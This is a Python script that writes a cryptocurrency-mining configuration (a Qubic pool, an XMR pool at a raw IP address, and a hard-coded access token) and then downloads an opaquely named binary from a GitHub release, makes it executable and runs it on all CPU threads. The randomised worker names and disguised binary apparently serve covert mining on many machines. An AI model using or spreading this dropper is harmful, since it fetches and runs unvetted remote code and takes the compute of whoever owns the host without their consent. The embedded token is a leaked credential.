import os
import json
import random
import subprocess
import hashlib
import stat
import urllib.request
from datetime import datetime, timedelta

# === 1. Generate worker name based on a random date and time + "_SVP15"
def generate_worker_name():
    # Generate a random datetime within a range (e.g., last 10 years)
    start_date = datetime(2015, 1, 1)
    end_date = datetime.now()
    random_days = random.randint(0, (end_date - start_date).days)
    random_seconds = random.randint(0, 86400)  # Random time within the day

    random_datetime = start_date + timedelta(days=random_days, seconds=random_seconds)
    
    # Format the date to a string
    date_str = random_datetime.strftime('%Y%m%d_%H%M%S')  # e.g., 20230913_154732
    
    return f"{date_str}_SVP15"

worker_name = generate_worker_name()
print(f"[+] Generated worker name: {worker_name}")

# === 2. Get total CPU threads using `nproc`
def get_cpu_threads():
    try:
        return int(subprocess.check_output(["nproc"]).decode().strip())
    except Exception as e:
        print(f"[!] Failed to get CPU threads: {e}")
        return 1

cpu_threads = get_cpu_threads()
print(f"[+] Detected CPU Threads: {cpu_threads}")

# === 3. Create JSON config ===
config = {
    "ClientSettings": {
        "poolAddress": "wss://solojetski.xyz/ws/LKLDRPOVVADJVARAUIEILBXYZICCGKKAYOMDLAGQYCFOZNVEYWJOGPZBETWH",
        "alias": worker_name,
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjdiMjkxY2Y5LTFiOGItNGYxZi05YWQxLTVkZGRlZmMwNDlhMyIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTI3OSwiZXhwIjoxNzg3MjQ3Mjc5LCJpYXQiOjE3NTU3MTEyNzksImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.mH99lwiIQw9EjTBgVlvE-9JsxERjmlPjbJBqYg4b1Ipw1pW8ehxX4O8EOg_MoL76NRRQIn2bdaWKeVINw6gzBrLIG8PM0r8Gcdr6c4iaXp-N4JqFQGI5Q95Nsh-gMdDq_MK0GW0jXdOx7dnSHJqGfDFlBQ6x58JLtL4TLNwS5v2ZNNfrGlgokB0pUt0j1jm7tFgvURCsa9IbL4mdDdryJT288iprJ0I2S22vP62bsRx9_dg6g5ZtM50Xt7nifSjnBCYRRwBdZf5xiKRbVVVr-ZeGBIbw8SUawbYLzOTxl-ICq4M345itbwyzgY7ti077DfSafUvQY6D8b0oJZF4h1w",
        "pps": True,
        "trainer": {
            "cpu": True,
            "gpu": False,
            "cpuThreads": cpu_threads
        },
        "xmrSettings": {
            "disable": False,
            "enableGpu": False,
            "poolAddress": "45.33.15.247:8081",
            "customParameters": f"-t {cpu_threads}"
        }
    }
}

with open("appsettings.json", "w") as f:
    json.dump(config, f, indent=4)

print("[+] Created appsettings.json")

# === 4. Download travsivp binary ===
travsivp_url = "https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/travsivp"
travsivp_filename = "travsivp"

if not os.path.exists(travsivp_filename):
    print("[+] Downloading travsivp...")
    urllib.request.urlretrieve(travsivp_url, travsivp_filename)
    print("[+] Download complete.")
else:
    print("[!] travsivp already exists. Skipping download.")

# === 5. Make executables
os.chmod(travsivp_filename, os.stat(travsivp_filename).st_mode | stat.S_IEXEC)
os.chmod("appsettings.json", os.stat("appsettings.json").st_mode | stat.S_IEXEC)
print("[+] Set executable permissions.")

# === 6. Run travsivp binary
print("[+] Running ./travsivp ...")
subprocess.run(["./travsivp"])
